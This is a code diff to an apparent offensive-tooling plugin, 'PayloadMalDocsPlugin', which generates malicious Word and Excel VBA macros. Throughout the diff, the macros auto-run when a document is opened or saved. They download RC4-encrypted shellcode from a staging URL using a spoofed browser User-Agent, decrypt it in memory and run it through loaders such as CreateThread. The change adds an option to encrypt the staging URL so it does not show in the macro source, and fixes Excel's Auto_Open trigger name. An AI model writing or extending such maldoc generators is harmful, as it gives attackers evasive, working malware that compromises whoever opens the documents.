@@ -464,7 +464,8 @@ def _vba_trigger_sub(trigger_type: str, call_target: str, is_word: bool = False)
         trigger_sub = "Auto_Save"
         event_sub = "Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)" if not is_word else "Sub Document_BeforeSave(ByVal SaveUI As Boolean, Cancel As Boolean)"
     else:
-        trigger_sub = "AutoOpen"
+        # Word uses AutoOpen; Excel uses Auto_Open (the correct legacy name for Excel)
+        trigger_sub = "AutoOpen" if is_word else "Auto_Open"
         event_sub = "Sub Document_Open()" if is_word else "Sub Workbook_Open()"
 
     lines = [f"Sub {trigger_sub}()\n    {call_target}\nEnd Sub\n"]
@@ -814,27 +815,21 @@ End Function
 
 
 
-def _vba_http_getbuf(url: str, rc4_key: bytes) -> str:
+def _vba_http_getbuf(url: str, rc4_key: bytes, obfuscate_url: bool = True) -> str:
     """
     Generate GetBuf(buf() As Byte) that downloads RC4-encrypted shellcode from
-    a URL at runtime and decrypts it in memory.  No shellcode or URL is embedded
-    as plaintext - both live as RC4-encrypted byte arrays in the VBA source.
+    a URL at runtime and decrypts it in memory.  No shellcode bytes are embedded.
 
-    The encrypted blob must be hosted at *url* before the document is opened.
-    Use rc4_encrypt(shellcode_bytes, rc4_key) at build time to produce it.
-
-    URL is encrypted at build time with a separate 8-byte key so no plaintext
-    staging URL appears in the VBA source or compiled p-code string tables.
+    When obfuscate_url=True the staging URL is RC4-encrypted at build time and
+    stored as an Array() of ciphertext bytes - no plaintext URL in VBA source.
+    When False the URL is a literal string (smaller, easier to audit in testing).
 
     WinHttp.WinHttpRequest.5.1 is available on all Windows >= Vista without
     extra dependencies.  Falls back to MSXML2.ServerXMLHTTP on failure.
     """
-    url_key = secrets.token_bytes(8)
-    enc_url = _rc4_encrypt(url.encode("ascii"), url_key)
-    url_enc_tokens = ", ".join(str(b) for b in enc_url)
-    url_key_tokens = ", ".join(str(b) for b in url_key)
     key_tokens = ", ".join(str(b) for b in rc4_key)
-    return (
+
+    rc4_func = (
         # data As Variant so callers can pass either Byte() or Array() without type mismatch
         "Private Function Rc4D(data As Variant, k As Variant) As Byte()\r\n"
         "    Dim s(255) As Integer\r\n"
@@ -859,15 +854,38 @@ def _vba_http_getbuf(url: str, rc4_key: bytes) -> str:
         "    Rc4D = o\r\n"
         "End Function\r\n"
         "\r\n"
+    )
+
+    if obfuscate_url:
+        url_key = secrets.token_bytes(8)
+        enc_url = _rc4_encrypt(url.encode("ascii"), url_key)
+        url_enc_tokens = ", ".join(str(b) for b in enc_url)
+        url_key_tokens = ", ".join(str(b) for b in url_key)
+        url_decl = (
+            "    Dim urlEnc As Variant\r\n"
+            "    Dim urlKey As Variant\r\n"
+            "    Dim urlDec() As Byte\r\n"
+            "    Dim sUrl As String\r\n"
+        )
+        url_resolve = (
+            f"    urlEnc = Array({url_enc_tokens})\r\n"
+            f"    urlKey = Array({url_key_tokens})\r\n"
+            "    urlDec = Rc4D(urlEnc, urlKey)\r\n"
+            "    sUrl = StrConv(urlDec, vbUnicode)\r\n"
+        )
+        url_open = '    http.Open "GET", sUrl, False\r\n'
+    else:
+        url_decl = ""
+        url_resolve = ""
+        url_open = f'    http.Open "GET", "{url}", False\r\n'
+
+    getbuf = (
         "Private Sub GetBuf(buf() As Byte)\r\n"
         "    On Error GoTo ErrH\r\n"
         "    Dim http As Object\r\n"
         "    Dim enc() As Byte\r\n"
         "    Dim kArr As Variant\r\n"
-        "    Dim urlEnc As Variant\r\n"
-        "    Dim urlKey As Variant\r\n"
-        "    Dim urlDec() As Byte\r\n"
-        "    Dim sUrl As String\r\n"
+        + url_decl +
         "    On Error Resume Next\r\n"
         '    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")\r\n'
         "    If Not (http Is Nothing) Then\r\n"
@@ -877,11 +895,8 @@ def _vba_http_getbuf(url: str, rc4_key: bytes) -> str:
         "        If Not (http Is Nothing) Then http.setOption 2, 13056\r\n"
         "    End If\r\n"
         "    On Error GoTo ErrH\r\n"
-        f"    urlEnc = Array({url_enc_tokens})\r\n"
-        f"    urlKey = Array({url_key_tokens})\r\n"
-        "    urlDec = Rc4D(urlEnc, urlKey)\r\n"
-        "    sUrl = StrConv(urlDec, vbUnicode)\r\n"
-        '    http.Open "GET", sUrl, False\r\n'
+        + url_resolve
+        + url_open +
         '    http.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"\r\n'
         "    http.Send\r\n"
         "    If http.Status <> 200 Then Exit Sub\r\n"
@@ -892,6 +907,8 @@ def _vba_http_getbuf(url: str, rc4_key: bytes) -> str:
         "ErrH:\r\n"
         "End Sub\r\n"
     )
+
+    return rc4_func + getbuf
 
 
 def _rc4_encrypt(data: bytes, key: bytes) -> bytes:
@@ -1579,6 +1596,7 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         loader_type: str = "createthread",
         target_process: str = "C:\\Windows\\System32\\notepad.exe",
         is_word: bool = False,
+        obfuscate_url: bool = False,
     ) -> str:
         """
         Generate a complete VBA payload that downloads RC4-encrypted shellcode
@@ -1587,8 +1605,12 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         *rc4_key* must match the key used to encrypt the staged blob (produced
         by rc4_encrypt_shellcode).  The encrypted blob should be hosted at *url*
         before the document is opened (see build artifact: shellcode.enc).
+
+        Set obfuscate_url=True to RC4-encrypt the URL at build time so no
+        plaintext staging URL appears in VBA source (mirrors the 0.9e obfuscation
+        toggle).  False (default) embeds the URL as a literal string.
         """
-        http_getbuf = _vba_http_getbuf(url, rc4_key)
+        http_getbuf = _vba_http_getbuf(url, rc4_key, obfuscate_url=obfuscate_url)
         dispatch = {
             "createthread":      lambda sc, tt: _vba_createthread(sc, tt, is_word),
             "enumlocales":       lambda sc, tt: _vba_enumlocales(sc, tt, is_word),
